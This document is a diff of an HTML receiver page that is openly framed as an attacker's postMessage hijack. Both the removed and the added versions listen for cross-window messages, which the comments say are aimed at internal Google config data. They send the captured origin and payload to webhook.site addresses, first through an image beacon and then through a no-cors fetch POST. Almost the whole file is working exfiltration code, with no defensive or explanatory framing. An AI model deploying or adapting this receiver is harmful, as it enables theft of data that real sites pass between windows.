@@ -1,21 +1,31 @@
 <!DOCTYPE html>
 <html>
-<head><title>Feedback Receiver Hijack</title></head>
-<body>
-<h2>Attacker Feedback Iframe</h2>
-<pre id="out">Waiting for messages...</pre>
-<script>
-  window.addEventListener("message", (e) => {
-    const log = `FROM: ${e.origin}\nDATA:\n${JSON.stringify(e.data, null, 2)}`;
-    document.getElementById("out").innerText = log;
+  <head>
+    <title>Receiver</title>
+    <script>
+      // Set marker so we only capture what’s intended
+      window.__NEEDLE = 'aloha_frame';
 
-    // Optionally exfiltrate to webhook
-    new Image().src = "https://webhook.site/46a78561-fda0-49fc-af64-9d7229854322?" + new URLSearchParams({
-      origin: e.origin,
-      data: JSON.stringify(e.data),
-      ts: Date.now()
-    }).toString();
-  }, false);
-</script>
-</body>
+      // Passive message logger
+      window.addEventListener('message', function(event) {
+        console.log('[RECEIVED POSTMESSAGE]', event);
+
+        // Filter only internal Google config messages
+        if (event.data && typeof event.data === 'object') {
+          const payload = JSON.stringify(event.data, null, 2);
+          console.log('[CONFIG PAYLOAD]', payload);
+
+          // Optional: Exfiltrate to webhook
+          fetch('https://webhook.site/ef7f6ec2-7d7c-4112-ab9a-a97f887200df', {
+            method: 'POST',
+            mode: 'no-cors',
+            body: payload
+          });
+        }
+      }, false);
+    </script>
+  </head>
+  <body>
+    <h1>Receiver active</h1>
+  </body>
 </html>
